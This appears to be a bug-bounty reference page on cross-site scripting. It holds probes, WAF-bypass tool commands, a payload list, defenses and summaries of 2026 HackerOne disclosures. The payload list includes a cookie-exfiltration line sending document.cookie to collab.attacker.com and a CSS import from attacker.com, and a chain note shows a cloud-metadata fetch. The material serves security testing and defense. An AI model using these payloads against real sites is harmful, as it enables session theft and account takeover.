# XSS Techniques

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: — · Items: 0_

---

## What

Cross-Site Scripting — inject executable JavaScript into a page's rendering context to steal sessions, exfiltrate tokens, or pivot to admin ATO. Three flavors: **reflected** (query/header echoed back), **stored** (persisted in DB, fires for every viewer), **DOM** (client-side sink reads untrusted source).

Why it still pays in 2026: CSP adoption is patchy, SameSite=Lax is the default but not universal, and stored XSS in admin-visible surfaces (ticket titles, user bios, uploaded filenames) chains directly to staff ATO. Framework defaults cover 80% — the remaining 20% is SVG uploads, template-engine raw-output contexts, and headers reflected in error pages.

2025/2026 hot vectors:
- **SVG uploads** rendering inline — `<svg onload=...>` fires under any `image/svg+xml` Content-Type without `Content-Disposition: attachment`
- **Template raw-output** — Handlebars `{{{ }}}`, Jinja2 `| safe`, Angular `[innerHTML]`, Vue `v-html`
- **Hydration-stage injection** — user data inlined into `__NEXT_DATA__`, `window.__NUXT__` without proper JSON-encoding
- **Header reflection** — `X-Forwarded-For`, `Referer`, `User-Agent` echoed in error/debug pages
- **Admin-panel stored XSS** — staff views user-submitted data → admin session steal

Grep targets: `innerHTML`, `document.write`, `eval`, `dangerouslySetInnerHTML`, `v-html`, `{{{`, `bypassSecurityTrust`, `insertAdjacentHTML`.

---

## CVEs

_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._

---

## Probes

```bash
# Reflection canary — find input echoed raw in HTML body
canary='kdai9999"><img src=x onerror=ALERT>'
curl -sG "https://target/search" --data-urlencode "q=$canary" | grep -F "$canary"
# If canary appears verbatim (including `"` and `<`) → reflected unescaped

# Attribute context break
curl -sG "https://target/profile" --data-urlencode 'name=" autofocus onfocus="alert(1)'

# JS string context break (look for quoted reflection inside <script>)
curl -sSL "https://target/page?name=test" | grep -oE "<script>.{0,500}test.{0,500}</script>"

# Header reflection
curl -sS "https://target/" -H "X-Forwarded-For: <kdai>" | grep '<kdai>'
curl -sS "https://target/nonexistent-path-XXXX" -H "Referer: <kdai>" | grep '<kdai>'

# SVG upload probe — check Content-Type on served file
curl -sSI "https://target/uploads/user.svg" | grep -iE 'content-(type|disposition)'
# image/svg+xml + no attachment → XSS-able

# DOM XSS discovery (browser-side) — Burp DOM Invader or headless
# List DOM sinks reading window.location.hash:
#   document.querySelectorAll('script').forEach(s => console.log(s.textContent.match(/location\.hash|URLSearchParams|document\.referrer/)))

# Hydration payload leak
curl -sSL https://target/ | grep -oE '__NEXT_DATA__[^<]*' | head -c 400
curl -sSL https://target/ | grep -oE 'window\.__NUXT__[^<]*' | head -c 400
```

WAF bypass tooling:

```bash
dalfox url "https://target/search?q=FUZZ" --waf-bypass --silence
python3 xsstrike.py -u "https://target/?q=test" --crawl
nuclei -u https://target -tags xss -severity medium,high,critical
```

Context reminders:
- Inside `<script>` block, HTML escaping is irrelevant — only JS-string escaping matters
- Inside an attribute value quoted with `"`, HTML-encoding of `<` alone is insufficient — check if `"` is encoded
- On reflected strings, always test both URL and form-body injection; sometimes only one is sanitized

---

## PoCs

_Public PoC links rolled up from items below._

_No PoCs in items yet._

---

## Reproduction

_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
_pending enrichment_

---

## Defense

Priority-ordered:

- **Context-aware output encoding** — use framework defaults (React JSX, Vue template, Django autoescape). Never concatenate user data into HTML manually.
- **CSP** — `default-src 'self'; script-src 'self' 'nonce-<random>'; object-src 'none'; base-uri 'self'`. Strip `'unsafe-inline'` and `'unsafe-eval'`. Report-only mode first, then enforce.
- **SVG uploads** — serve from a separate origin with `Content-Disposition: attachment` or rewrite to PNG server-side. Never `image/svg+xml` on same-origin.
- **No raw-output template features in production** — lint for `{{{ }}}`, `| safe`, `v-html`, `[innerHTML]`, `dangerouslySetInnerHTML`. Allowlist a tiny set of rich-text fields and sanitize with DOMPurify.
- **Hydration safety** — JSON-encode before inlining with `<script type="application/json">`, then parse at runtime. Don't inline raw user input into inline `<script>`.
- **Cookie hardening** — `HttpOnly` on session cookies (blocks `document.cookie` theft), `Secure`, `SameSite=Strict` on sensitive endpoints, short session lifetime.
- **Header reflection** — strip or encode `X-Forwarded-For`/`Referer`/`User-Agent` before displaying in error pages. Custom error pages should not echo request data at all.
- **Admin panels** — render user-supplied content in an iframe with `sandbox` attribute (no `allow-scripts`) when preview is required. Better: render as text only.
- **Detection** — WAF rules for common XSS tokens (`<svg`, `onerror=`, `onload=`, `javascript:`), CSP violation reports piped to SIEM, monitor for spikes in `document.cookie` access from non-whitelisted origins in RUM data.

---

## References

_Populated by daily refresh-latest pipeline._

---

## Items

> Cross-Site Scripting — injecting executable JavaScript into a page context to steal sessions, exfiltrate data, or chain to further exploitation.

## 2026-04-23

### PostMessage Origin Bypass — Complete Exploitation Guide
- **Date:** 2026-01-31 · **Source:** [intigriti.com](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities) · **Class:** technique
- **What:** Full walkthrough — wildcard `targetOrigin` in postMessage callers, missing `origin` check in `addEventListener('message')` handlers, and chaining for XSS and data exfil across iframe boundaries.
- **Why it matters:** postMessage is invisible to most automated scanners — requires JS execution to trigger. Origin checks are often business logic, not framework-enforced. SPAs using OAuth or payment widgets that cross origins are prime targets. Intigriti ran a companion CTF on this pattern (0126).
- **Hunt signal:** `grep -r "addEventListener.*message" src/` → check if handler validates `event.origin` before processing data. Trace `postMessage(` callers → check if `targetOrigin` is `'*'`. Test: send `window.postMessage({action:'...'}, '*')` from browser console, watch for cross-origin leaks in network tab. [source] Intigriti blog Jan 2026.

### PortSwigger: Unicode Overflow → Character Blocklist Bypass
- **Date:** 2025-01-28 · **Source:** [portswigger.net](https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows) · **Class:** technique
- **What:** Specific Unicode codepoints normalize (via NFC/NFKC) to ASCII equivalents (`<`, `>`, `'`, `"`) after WAF inspection — byte-level blocklists fire on the original codepoint, app processes the normalized form.
- **Why it matters:** Works against Cloudflare, Akamai, and custom regex filters that don't normalize input before inspection. Any input that goes through Unicode normalization server-side (Python `unicodedata.normalize`, Java `Normalizer`, .NET `String.Normalize`) after filtering is potentially bypassed. Also see `Cheatsheets/waf-bypass.md`.
- **Hunt signal:** Fuzz character-filtered fields with lookalike Unicode: `＜` (U+FF1C), `﹤` (U+FE64), `‹` (U+2039) for `<`; `＞` (U+FF1E) for `>`. Check if stored/reflected value normalizes to dangerous ASCII. `curl -d 'q=＜script＞' https://target/search` → grep response for `<script>`. [source] PortSwigger Research Jan 2025 · [inference] most WAFs still don't normalize before inspection.

## Surface

- User-controlled input reflected in HTML body, attributes, or JS variables
- DOM sinks: `innerHTML`, `document.write`, `eval`, `location.href`, `setTimeout(str)`
- JSON responses used directly in `<script>` blocks without escaping
- SVG upload endpoints — SVG is HTML-parsed, `<script>` executes
- Template engines with raw output: Jinja2 `{{ }}`, Handlebars `{{{ }}}`, Angular `[innerHTML]`
- `X-Forwarded-For`, `Referer`, `User-Agent` headers reflected in error pages or logs
- Stored XSS in names, bios, comments, ticket titles — anything displayed to other users
- Admin panels rendering user-supplied data — stored XSS here escalates to admin session

## Test Approach

1. **Map all input sinks** — use Burp passive scan + manual review of JS source for DOM sinks
2. **Test reflection with a canary**: `"><img src=x onerror=alert(1)>` — look for unescaped output
3. **Attribute injection**: `" autofocus onfocus=alert(1) x="` for attribute contexts
4. **JS string injection**: `'; alert(1); //` or `\'; alert(1); //` in JS variable contexts
5. **DOM XSS**: trace `location.hash`, `URL`, `document.referrer` → DOM sinks in browser console
6. **WAF bypass**: use dalfox for automated bypass attempts:

   ```
   dalfox url "https://target.com/search?q=FUZZ" \
     --waf-bypass --silence --output results.txt
   ```

7. **Stored XSS sweep** — inject payloads in every profile/settings field; check how each field renders in other views (admin panel, email preview, PDF export)
8. **Header-based XSS** — set `X-Forwarded-For: <script>alert(1)</script>` and trigger an error page

## Tools

- **dalfox** — parameter-aware XSS scanner with WAF bypass; `dalfox url "https://target.com/search?q=test"`
- **XSStrike** — context-aware payload generation; `python3 xsstrike.py -u "https://target.com/?q=test"`
- **DOM Invader** (Burp) — traces DOM sources and sinks in browser context
- **nuclei** — template-based XSS detection: `nuclei -t xss/ -u https://target.com`

## Payloads / Probes

```html
<!-- Basic reflection test -->
"><img src=x onerror=alert(document.domain)>

<!-- Attribute context -->
" autofocus onfocus="alert(1)

<!-- JS string break -->
'; alert(document.cookie); //

<!-- SVG payload -->
<svg onload=alert(1)>

<!-- Template/Angular injection -->
{{constructor.constructor('alert(1)')()}}

<!-- Stored XSS — cookie exfil -->
<img src=x onerror="fetch('https://collab.attacker.com/?c='+document.cookie)">

<!-- CSS injection fallback (restricted contexts) -->
<style>@import 'https://attacker.com/steal.css'</style>
```

## Chain Opportunities

- **Stored XSS → Admin ATO** — payload fires in admin panel, exfiltrates CSRF token or session cookie
- **XSS + CSRF** — use XSS to perform state-changing actions bypassing SameSite cookies
- **XSS → SSRF** — `fetch('http://169.254.169.254/latest/meta-data/')` from victim browser
- **DOM XSS → prototype pollution** — pollute Object.prototype via `__proto__` in DOM sink
- **Reflected XSS → phishing** — crafted link with payload, delivered via open redirect

## Recent Intel

- **CVE-2023-24488** · Citrix Gateway open redirect + stored XSS in admin interface, bypass via URL param manipulation · https://www.assetnote.io/resources/research/advisory-citrix-gateway-open-redirect-and-xss-cve-2023-24488
- **Citrix Gateway firmware XSS** · Reverse-engineered admin panel revealed stored XSS via session parameter, auth context bypass · https://www.assetnote.io/resources/research/reversing-citrix-gateway-for-xss
- **Inline style exfiltration** · CSS injection via `style` attributes (no `<style>` block needed) leaks CSRF tokens char-by-char via background-image requests · https://portswigger.net/research/inline-style-exfiltration


## 2026-04-19 — H1 disclosures

### Stored XSS in attachment-display exploitable through SameSite

- **2026-04-19** · sev: Medium · bounty: undisclosed
- Source: [hackerone.com/3594137](https://hackerone.com/reports/3594137) · Reporter: [@aikido_security](https://hackerone.com/aikido_security) · Team: [Nextcloud](https://hackerone.com/nextcloud)
- CWE: Cross-site Scripting (XSS) - Stored

**What**

A stored XSS vulnerability was discovered in the attachment-display feature of Roundcube. By uploading an HTML file and opening it through the display-attachment endpoint, the embedded script could execute under the Roundcube origin. The issue was caused by the lack of a restrictive Content Security Policy in the attachment display flow, unlike the general attachment viewer.

**Hunt signal:** Upload `.html` to any attachment-handling endpoint, then request the view/display URL. Check response `Content-Type: text/html` + absent/lax `Content-Security-Policy`.
**Grep:** `rg -n 'attachment.*(display|view|inline)' src/ | rg -v 'Content-Security-Policy'`
**Nuclei:** `xss,upload`
**Pass-if:** Target always returns `Content-Disposition: attachment` or strong CSP (`script-src 'self'`).

---

### DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover

- **2026-04-14** · sev: High · bounty: $500
- Source: [hackerone.com/3608199](https://hackerone.com/reports/3608199) · Reporter: [@xavlimsg](https://hackerone.com/xavlimsg) · Team: [Basecamp](https://hackerone.com/basecamp)
- CWE: Cross-site Scripting (XSS) - DOM

**What**

A DOM XSS vulnerability was discovered in the file import functionality of the Fizzy application. The vulnerability allowed an attacker to craft a malicious filename that, when previewed by the victim user, would inject a second form submission into the import page. This enabled the attacker to perform actions on the victim's account, such as changing the email address, creating a personal access token, and deleting the account, all using the victim's authenticated session.

**Hunt signal:** Upload a file with filename `<img src=x onerror=alert(1)>.csv` to any file-import endpoint, then trigger the import preview page. Check if the filename is rendered raw in the DOM.
**Grep:** `rg -n 'filename|file\.name' --type html --type js | rg -v 'textContent|innerText|escape|sanitize'`
**Nuclei:** `xss,dom`
**Pass-if:** Import flow never renders the original filename client-side (e.g., only shows server-generated UUIDs or sanitizes via `textContent`).

---

### [Variation of #3321406] YetAnother 1-Click Chaining of Self-XSS, Cookie Tossing and AntiCSRF Token Prediction leads to auto approval in AccessTempAuth

- **2026-04-14** · sev: High · bounty: undisclosed
- Source: [hackerone.com/3423950](https://hackerone.com/reports/3423950) · Reporter: [@matured_kazama](https://hackerone.com/matured_kazama) · Team: [Cloudflare Public Bug Bounty](https://hackerone.com/cloudflare)
- CWE: Cross-site Scripting (XSS) - Stored

**What**

A vulnerability in Cloudflare Access involving the Browser Isolation email field was discovered, which could allow for unauthorized approvals within the Temporary Auth workflow. The issue has been fully remediated.

**Hunt signal:** pass — summary too thin

---


## 2026-07-01 — H1 disclosures

### Reflected XSS via unsanitised refresh parameter in zone invocation tag

- **2026-06-25** · sev: Medium · bounty: undisclosed · cve: CVE-2026-50740
- Source: [hackerone.com/3780806](https://hackerone.com/reports/3780806) · Reporter: [@kanon4](https://hackerone.com/kanon4) · Team: [Revive Adserver](https://hackerone.com/revive_adserver)
- CWE: Cross-site Scripting (XSS) - Reflected

**What**

A missing sanitization of user input in the zone-include.php script of Revive Adserver 6.0.7 and earlier was reported. This vulnerability allowed a low-privileged user to perform reflected XSS attacks by exploiting the refresh parameter of the iFrame invocation tag.

**PoC refs:** search `github.com/search?q=CVE-2026-50740` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2026-50740.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

### Stored XSS in maintenance tools via unescaped entity names

- **2026-06-25** · sev: Medium · bounty: undisclosed · cve: CVE-2026-50742
- Source: [hackerone.com/3781311](https://hackerone.com/reports/3781311) · Reporter: [@an_gr_y](https://hackerone.com/an_gr_y) · Team: [Revive Adserver](https://hackerone.com/revive_adserver)
- CWE: Cross-site Scripting (XSS) - Stored

**What**

A stored XSS vulnerability was discovered in the maintenance tools of Revive Adserver 6.0.7. The issue was caused by entity names being displayed without proper escaping when inconsistencies were detected in the `maintenance-acl-check.php` and `maintenance-banners-check.php` files.

**PoC refs:** search `github.com/search?q=CVE-2026-50742` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2026-50742.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

### Reflected XSS in stats‑video.php via improperly encoded URL parameters

- **2026-06-25** · sev: Medium · bounty: undisclosed · cve: CVE-2026-50745
- Source: [hackerone.com/3793243](https://hackerone.com/reports/3793243) · Reporter: [@kanon4](https://hackerone.com/kanon4) · Team: [Revive Adserver](https://hackerone.com/revive_adserver)
- CWE: Cross-site Scripting (XSS) - Reflected

**What**

A reflected XSS vulnerability was discovered in the stats‑video.php script due to improper encoding of user input in the URL parameters.

**PoC refs:** search `github.com/search?q=CVE-2026-50745` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2026-50745.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

### Reflected XSS in AI Chat Bot Greetings at help.shopify.com via Markdown Image Rendering

- **2026-06-18** · sev: Medium · bounty: $1,600
- Source: [hackerone.com/2509022](https://hackerone.com/reports/2509022) · Reporter: [@saltymermaid](https://hackerone.com/saltymermaid) · Team: [Shopify](https://hackerone.com/shopify)
- CWE: Cross-site Scripting (XSS) - Reflected

**What**

A reflected XSS vulnerability was reported in the AI chat bot greetings at help.shopify.com. The issue was caused by the rendering of a markdown image in the greeting, which allowed the attacker to inject a payload through the image URL. The vulnerability was addressed by removing the attacker-controlled greeting input path.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

### Reflected Cross-Site Scripting (XSS) found on IBM.com domain

- **2026-06-15** · sev: — · bounty: undisclosed
- Source: [hackerone.com/3664261](https://hackerone.com/reports/3664261) · Reporter: [@entrovyx](https://hackerone.com/entrovyx) · Team: [IBM](https://hackerone.com/ibm)
- CWE: Cross-site Scripting (XSS) - Reflected

**What**

A reflected Cross-Site Scripting (XSS) vulnerability was found on the IBM.com domain. The vulnerability was reported to IBM, analyzed, and remediated. The external researcher who reported the issue was acknowledged.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---


## 2026-07-23 — H1 disclosures

### Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat

- **2026-07-16** · sev: Medium · bounty: undisclosed
- Source: [hackerone.com/3779690](https://hackerone.com/reports/3779690) · Reporter: [@olidayw](https://hackerone.com/olidayw) · Team: [Rocket.Chat](https://hackerone.com/rocket_chat)
- CWE: Cross-site Scripting (XSS) - Stored

**What**

A vulnerability was discovered in the HTML file export feature of Rocket.Chat. The vulnerability allowed an attacker to inject arbitrary JavaScript code that would execute when the exported HTML file was opened. The root cause was that the application did not properly sanitize or escape user-supplied data before including it in the exported HTML. As a result, an unauthenticated attacker could leverage the vulnerability to perform actions such as data exfiltration and credential phishing.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

### Stored XSS on Trix Editor version latest (2.1.16) - Sanitizer Bypass 

- **2026-07-14** · sev: Low · bounty: $337
- Source: [hackerone.com/3581911](https://hackerone.com/reports/3581911) · Reporter: [@newbiefromcoma](https://hackerone.com/newbiefromcoma) · Team: [Basecamp](https://hackerone.com/basecamp)
- CWE: Cross-site Scripting (XSS) - Stored

**What**

A vulnerability was discovered in Trix Editor version 2.1.16 that allowed for a Stored Cross-Site Scripting (XSS) attack. The vulnerability arose from an unsafe interaction between Trix's custom DOMPurify configuration and its document serialization logic. The issue was caused by Trix's use of the "data-trix-serialized-attributes" attribute, which was not properly sanitized during the serialization process, allowing an attacker to inject malicious JavaScript code. The vulnerability was deemed a direct bypass of previously reported Trix Editor vulnerabilities.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---


## 2026-08-30 — H1 disclosures

### Author → stored XSS in wp-admin: unescaped sub-size filename from attachment metadata breaks out of the `src` attribute in `get_media_item()`

- **2026-08-28** · sev: Critical · bounty: undisclosed
- Source: [hackerone.com/3931771](https://hackerone.com/reports/3931771) · Reporter: [@jakubk](https://hackerone.com/jakubk) · Team: [WordPress](https://hackerone.com/wordpress)
- CWE: Cross-site Scripting (XSS) - Stored

**What**

A vulnerability was discovered in the WordPress media upload and finalize endpoints. An author could upload a crafted image with a malicious filename, which was then stored verbatim by the endpoint and rendered without proper escaping in the WordPress admin media library. This could allow the execution of arbitrary JavaScript in the context of an administrator's browser session.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

### Pre-authentication Stored XSS in Essity Customer-Service Pipeline via ContactApi (reCAPTCHA bypass + no rate limit)

- **2026-08-27** · sev: Critical · bounty: undisclosed
- Source: [hackerone.com/3729501](https://hackerone.com/reports/3729501) · Reporter: [@matty69v](https://hackerone.com/matty69v) · Team: [Essity](https://hackerone.com/essity)
- CWE: Cross-site Scripting (XSS) - Stored

**What**

A pre-authentication stored cross-site scripting (XSS) vulnerability was discovered in the customer service API of the Essity company. The API accepted unauthenticated ticket submissions with arbitrary HTML/JavaScript in multiple fields, bypassing reCAPTCHA validation, CSRF protection, and rate limiting. When customer service operators viewed these tickets in the Umbraco back-office, the stored XSS executed in their authenticated session, enabling potential account takeover and other attacks. …

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

### @jitsi/docker-jitsi-meet: `/colibri-relay-ws/` unsafe nginx regex (OCTO relay configuration)

- **2026-08-25** · sev: Low · bounty: undisclosed
- Source: [hackerone.com/3889473](https://hackerone.com/reports/3889473) · Reporter: [@a3z4km3](https://hackerone.com/a3z4km3) · Team: [8x8](https://hackerone.com/8x8-bounty)
- CWE: Cross-site Scripting (XSS) - Generic

**What**

An unsafe nginx regex pattern was discovered in the `/colibri-relay-ws/` location of the @jitsi/docker-jitsi-meet project. The regex `[a-zA-Z0-9-\\._]+` accepted arbitrary domain names and IP addresses for proxy_pass directives, allowing unauthenticated requests to be proxied to attacker-specified destinations. The vulnerable nginx location and associated relay WebSocket proxy configuration have been removed.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

### URI scheme validation bypass in ActionText `to_markdown` via user-supplied `<action-text-markdown>` marker tag

- **2026-08-24** · sev: Medium · bounty: undisclosed
- Source: [hackerone.com/3727743](https://hackerone.com/reports/3727743) · Reporter: [@offsetmd](https://hackerone.com/offsetmd) · Team: [Ruby on Rails](https://hackerone.com/rails)
- CWE: Cross-site Scripting (XSS) - Reflected

**What**

_No H1 summary provided._

**Hunt signal:** pass — summary too thin

---

### Stored HTML Injection (CWE-79) via Livechat Visitor Name

- **2026-08-20** · sev: Low · bounty: undisclosed · cve: CVE-2026-65644
- Source: [hackerone.com/3872858](https://hackerone.com/reports/3872858) · Reporter: [@hillng](https://hackerone.com/hillng) · Team: [Rocket.Chat](https://hackerone.com/rocket_chat)
- CWE: Cross-site Scripting (XSS) - DOM

**What**

_No H1 summary provided._

**PoC refs:** search `github.com/search?q=CVE-2026-65644` · [trickest/cve](https://github.com/trickest/cve/blob/main/CVE-2026-65644.md) · [nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)

**Hunt signal:** pass — summary too thin

---

### Stored XSS in nameserver field on account settings page

- **2026-07-31** · sev: Low · bounty: undisclosed
- Source: [hackerone.com/3644182](https://hackerone.com/reports/3644182) · Reporter: [@axolot23](https://hackerone.com/axolot23) · Team: [Tucows (VDP)](https://hackerone.com/tucows_vdp)
- CWE: Cross-site Scripting (XSS) - Stored

**What**

A stored XSS vulnerability was discovered in the nameserver field on the account settings page. The lack of input validation and weak CSP configuration allowed the injection of malicious JavaScript code that executed when the settings page was reloaded. The vulnerability was limited to a self-XSS scenario, affecting only the account owner who injected the payload and not other users.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

### Stored XSS via SVG Upload — check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)

- **2026-07-30** · sev: Medium · bounty: undisclosed
- Source: [hackerone.com/3606773](https://hackerone.com/reports/3606773) · Reporter: [@a7mmr](https://hackerone.com/a7mmr) · Team: [phpBB](https://hackerone.com/phpbb)
- CWE: Cross-site Scripting (XSS) - Stored

**What**

A stored XSS vulnerability was discovered in phpBB 4.0.0-a2-dev. The vulnerability was caused by an incomplete blocklist for file uploads and a 256-byte read limit in the content scanning check. Specifically, SVG files with malicious payloads in the onload and onbegin attributes were able to bypass the content check and be stored on the server. Additionally, any content beyond the 256-byte limit was not scanned, allowing payloads like <script> tags to be successfully uploaded. …

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---

## 2026-08-30

### What's in a Tag Name? JavaScript in Tag Names
- **Tags:** `#xss` `#web`
- **Severity:** medium · **Hunt:** 3/5 · **Score:** 22.5 · **Status:** poc · **Age:** 0d
- **Sources:** [1](https://portswigger.net/research/whats-in-a-tag-name-javascript-apparently) · [2](https://medium.com/@zishanfiroz/how-i-landed-in-iiscs-hall-of-fame-stored-xss-via-svg-upload-194edc071f8a?source=rss------bug_bounty-5)

**What's in a Tag Name? JavaScript in Tag Names** — HTML tag names accept far more characters after the initial letter than commonly assumed, enabling XSS payloads inside tag names that bypass WAFs and sanitizers expecting only alphanumeric content. Hunt: inject non-alphanumeric characters (e.g., `<x/onmouseover=alert(1)>` or custom tag variants) in reflected input contexts where tag creation is possible but filters strip standard XSS vectors. [src](https://portswigger.net/research/whats-in-a-tag-name-javascript-apparently)

---
*Clustered 2 sources for this item.*

